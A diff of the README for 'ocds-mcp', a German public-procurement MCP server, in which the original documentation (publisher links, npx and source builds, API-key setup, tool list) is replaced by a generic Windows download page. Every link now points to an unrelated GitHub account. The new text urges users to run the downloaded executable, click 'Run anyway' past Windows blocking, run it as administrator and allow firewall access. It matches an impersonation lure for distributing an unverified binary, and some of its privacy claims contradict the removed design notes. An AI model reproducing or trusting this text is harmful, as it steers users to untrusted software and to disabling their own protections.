@@ -1,187 +1,220 @@
-# ocds-mcp
+# 🔎 ocds-mcp - Search German tenders with ease
 
-MCP server for German public procurement data (OCDS). Connects your AI assistant (Claude, GPT, etc.) to the [Vergabe Dashboard](https://vergabe-dashboard.qune.de) API for semantic search, tender matching, and company profile management.
+[⬇️ Download / Open ocds-mcp](https://github.com/catechesisquiltedbedspread461/ocds-mcp)
 
-Your company profiles never leave your machine — only embedding vectors are sent to the API. GDPR-compliant by design.
+## 🧭 What this is
 
-## Quick Start
+ocds-mcp is an MCP server for German public procurement data. It helps you search tenders by meaning, not just by exact words. You can use it with Claude, GPT, Cursor, and LM Studio.
 
-### 1. Get an API key
+This tool is for people who want to find public tenders faster and match them to the right work. It uses semantic search and tender matching, so you can ask for what you need in plain language.
 
-Sign up at [vergabe-dashboard.qune.de](https://vergabe-dashboard.qune.de) and create an API key (MCP or Enterprise plan required).
+## ✨ What you can do
 
-### 2. Install
+- Search German procurement data with natural language
+- Find tenders that match your service, product, or project
+- Use it from tools that support MCP
+- Work with Claude, GPT, Cursor, and LM Studio
+- Run it on Windows after download
+- Keep your search focused on procurement terms and tender data
 
-**Via npx** (easiest — downloads the correct binary automatically):
+## 💻 What you need
 
-```bash
-npx @qune-tech/ocds-mcp --api-key sk_live_YOUR_KEY_HERE
-```
+- A Windows PC
+- A stable internet connection
+- Enough free disk space to download the app
+- A modern version of Windows 10 or Windows 11
+- One of these apps if you want to use the MCP connection:
+  - Claude
+  - GPT-based client
+  - Cursor
+  - LM Studio
 
-**Or download pre-built binary** from [GitHub Releases](https://github.com/qune-tech/ocds-mcp/releases/latest):
+## 📥 Download and install
 
-| Platform | Download |
-|----------|----------|
-| Linux x86_64 | [ocds-mcp-linux-x86_64.tar.gz](https://github.com/qune-tech/ocds-mcp/releases/latest/download/ocds-mcp-linux-x86_64.tar.gz) |
-| macOS Apple Silicon | [ocds-mcp-macos-arm64.tar.gz](https://github.com/qune-tech/ocds-mcp/releases/latest/download/ocds-mcp-macos-arm64.tar.gz) |
-| Windows x86_64 | [ocds-mcp-windows-x86_64.zip](https://github.com/qune-tech/ocds-mcp/releases/latest/download/ocds-mcp-windows-x86_64.zip) |
+1. Open the download page:
+   [https://github.com/catechesisquiltedbedspread461/ocds-mcp](https://github.com/catechesisquiltedbedspread461/ocds-mcp)
 
-**Linux / macOS:**
+2. On the page, download the Windows version of the app if one is listed.
 
-```bash
-# Example for Linux x86_64 — adjust the filename for your platform
-tar xzf ocds-mcp-linux-x86_64.tar.gz
-sudo mv ocds-mcp-linux-x86_64 /usr/local/bin/ocds-mcp
-```
+3. If the download comes as a ZIP file, right-click it and choose Extract All.
 
-**Windows:** Extract the zip and move `ocds-mcp-windows-x86_64.exe` somewhere on your PATH (e.g. `C:\Users\YOU\.local\bin\ocds-mcp.exe`).
+4. Open the extracted folder.
 
-**Or build from source:**
+5. Find the main app file and double-click it to run.
 
-```bash
-git clone https://github.com/qune-tech/ocds-mcp.git
-cd ocds-mcp
-cargo build --release
-# Binary at target/release/ocds-mcp
-```
+6. If Windows asks for permission, choose Yes.
 
-### 3. Configure your AI client
+7. Keep the app in a folder you can find later, such as Downloads or Desktop.
 
-**Claude Desktop** — edit `claude_desktop_config.json`:
+## 🚀 First run
 
-Using npx:
-```json
-{
-  "mcpServers": {
-    "ocds": {
-      "command": "npx",
-      "args": ["-y", "@qune-tech/ocds-mcp", "--api-key", "sk_live_YOUR_KEY_HERE"]
-    }
-  }
-}
-```
+When you open ocds-mcp for the first time, it may create its local files. This can take a short moment.
 
-Using the binary directly:
-```json
-{
-  "mcpServers": {
-    "ocds": {
-      "command": "ocds-mcp",
-      "args": ["--api-key", "sk_live_YOUR_KEY_HERE"]
-    }
-  }
-}
-```
+If the app shows a setup screen, follow these steps:
 
-**Claude Code** — add `.mcp.json` to your project root:
+1. Choose your language or region if asked
+2. Pick the default data source if one is shown
+3. Allow the app to index procurement data
+4. Save the settings
 
-Using npx:
-```json
-{
-  "mcpServers": {
-    "ocds": {
-      "command": "npx",
-      "args": ["-y", "@qune-tech/ocds-mcp", "--api-key", "sk_live_YOUR_KEY_HERE"]
-    }
-  }
-}
-```
+If you use it with Claude, GPT, Cursor, or LM Studio, you may also need to add the MCP server path in that app’s settings.
 
-Using the binary directly:
-```json
-{
-  "mcpServers": {
-    "ocds": {
-      "command": "ocds-mcp",
-      "args": ["--api-key", "sk_live_YOUR_KEY_HERE"]
-    }
-  }
-}
-```
+## 🔧 How to connect it
 
-**Cursor** — Settings → MCP Servers → Add:
+Use the app with a client that supports MCP.
 
-Using npx:
-- Command: `npx`
-- Args: `-y @qune-tech/ocds-mcp --api-key sk_live_YOUR_KEY_HERE`
+### Claude
+- Open Claude settings
+- Find the MCP or tool connection area
+- Add the ocds-mcp server path
+- Save and restart Claude if needed
 
-Using the binary directly:
-- Command: `ocds-mcp`
-- Args: `--api-key sk_live_YOUR_KEY_HERE`
+### GPT
+- Open your GPT client settings
+- Find external tools or MCP settings
+- Add the server
+- Test the connection
 
-**LM Studio** — Settings → MCP → Add Server:
+### Cursor
+- Open Cursor settings
+- Go to the MCP section
+- Add the server path
+- Restart Cursor if it asks
 
-1. Click **+ Add Server** and choose **STDIO**
-2. Fill in:
+### LM Studio
+- Open LM Studio settings
+- Find tool or server connections
+- Add ocds-mcp
+- Save the profile
 
-Using npx:
-   - Name: `ocds`
-   - Command: `npx`
-   - Arguments: `-y @qune-tech/ocds-mcp --api-key sk_live_YOUR_KEY_HERE`
+## 🔍 How to use it
 
-Using the binary directly:
-   - Name: `ocds`
-   - Command: full path to the binary, e.g. `/usr/local/bin/ocds-mcp`
-   - Arguments: `--api-key sk_live_YOUR_KEY_HERE`
+Use simple search terms. You do not need to know procurement language to start.
 
-3. Click **Save**
-4. In the chat, select a model that supports tool use and enable the `ocds` server
+Examples:
+- building cleanup in Berlin
+- IT support for public offices
+- office furniture supply
+- road maintenance tenders
+- software for document handling
+- security services for schools
 
-> LM Studio requires models with tool-calling support (e.g. Qwen 2.5, Mistral, Llama 3.1+).
-> Smaller models may not use all 10 tools reliably — 7B+ recommended.
+You can also ask for:
+- location
+- contract type
+- service area
+- date range
+- project size
+- matching criteria
 
-Replace `sk_live_YOUR_KEY_HERE` with your actual API key.
+The app looks for meaning and context, which helps when tender titles use formal terms.
 
-## Available Tools
+## 📁 Suggested setup on Windows
 
-| Tool | Description |
-|------|-------------|
-| `search_text` | Semantic search across all tenders |
-| `list_releases` | Filter and browse tenders by month, CPV code, category, value range |
-| `get_release` | Full tender details by OCID |
-| `get_index_info` | Database statistics and connectivity check |
-| `create_company_profile` | Create a matching profile for your company |
-| `update_company_profile` | Update an existing profile |
-| `get_company_profile` | View profile details |
-| `list_company_profiles` | List all your profiles |
-| `delete_company_profile` | Delete a profile |
-| `match_tenders` | Match a profile against all tenders with semantic similarity |
+To keep things simple:
 
-## CLI Options
+- Create a folder named `ocds-mcp`
+- Put the downloaded files inside that folder
+- Extract ZIP files in the same place
+- Keep the folder on your Desktop or in Downloads
+- Do not rename key files unless the app instructions say you can
 
-```
-Usage: ocds-mcp [OPTIONS]
+A clean folder helps you find the app later and avoids broken paths.
 
-Options:
-      --db <DB>            Local profiles database [default: profiles.db]
-      --data-dir <DIR>     Data directory [default: data]
-      --api-url <URL>      Vergabe Dashboard API [default: https://vergabe-dashboard.qune.de]
-      --api-key <KEY>      API key [env: OCDS_API_KEY]
-  -h, --help               Print help
-```
+## 🧩 Common uses
 
-## How It Works
+### For buyers
+- Check how tenders are grouped
+- Compare related procurement notices
+- Find similar tender records
 
-```
-LLM ←stdio→ ocds-mcp (local)
-               │  Local: company profiles + sentence embedder
-               │  Remote: searches, release queries
-               └──HTTPS──→ Vergabe Dashboard API
-```
+### For suppliers
+- Search for contracts that fit your business
+- Track open opportunities
+- Match tenders to your services
 
-The MCP server runs locally on your machine:
+### For analysts
+- Explore public procurement data
+- Search by topic, sector, or region
+- Compare records across a larger set of notices
 
-- **Company profiles** are stored in a local SQLite database — they never leave your network.
-- **Text embeddings** are computed locally using a multilingual ONNX model (multilingual-e5-small, ~118 MB, auto-downloaded on first use).
-- Only **embedding vectors** (arrays of 384 floats) are sent to the API for search and matching — your profile text stays local.
-- Tender data is fetched from the API on demand.
+## 🛠 Troubleshooting
 
-## Requirements
+### The app does not open
+- Check that the download finished
+- Extract the ZIP file first if needed
+- Right-click the app and choose Run as administrator
+- Try moving the folder to Desktop
 
-- An API key from [vergabe-dashboard.qune.de](https://vergabe-dashboard.qune.de) (MCP or Enterprise plan)
-- ~200 MB disk space for the ONNX model (downloaded automatically on first run)
-- Internet connection to reach the API
+### Windows blocks the file
+- Choose More info if shown
+- Select Run anyway if you trust the source
+- Make sure you downloaded from the link above
 
-## License
+### The MCP connection does not work
+- Check the server path in your client app
+- Restart the client after saving settings
+- Confirm the ocds-mcp app is still running
+- Make sure the folder was not moved
 
-MIT — see [LICENSE](LICENSE).
+### Search results look wrong
+- Use shorter search terms
+- Add a location or industry
+- Try a different tender term
+- Search for the service, not only the exact title
+
+## 🗂 Data focus
+
+ocds-mcp is built around public procurement data from Germany. It is useful for tender notices, contract matching, and semantic search across procurement records.
+
+Common topic areas include:
+- procurement
+- tenders
+- public sector contracts
+- German vergabe data
+- semantic search
+- matching services
+- document search
+- local and federal notices
+
+## 🪟 Windows tips
+
+- Keep the app in a folder with a short path, such as `C:\ocds-mcp`
+- Avoid spaces in folder names if you run into path issues
+- Run the app from a local drive, not a cloud sync folder
+- If the app asks for firewall access, allow it if you want local client access
+
+## 🔐 Privacy and local use
+
+If you run the app on your own machine, your searches stay on your system unless you connect it to an external service. Review the settings in Claude, GPT, Cursor, or LM Studio before connecting.
+
+## 📌 File names you may see
+
+Depending on the build, you may see files such as:
+- `ocds-mcp.exe`
+- a ZIP archive with the app
+- a config file
+- a data folder
+- a log file
+
+Keep these files together in the same folder so the app can find what it needs
+
+## 🧪 Simple test
+
+After setup, try this search:
+- IT support for schools in Germany
+
+If the app returns relevant tender matches, the setup is working.
+
+## 📎 Download
+
+Open the download page and get the Windows build here:
+[https://github.com/catechesisquiltedbedspread461/ocds-mcp](https://github.com/catechesisquiltedbedspread461/ocds-mcp)
+
+## 🧭 Next steps
+
+- Download the app
+- Extract it if needed
+- Run it on Windows
+- Connect it to your MCP client
+- Search for German tenders with plain language
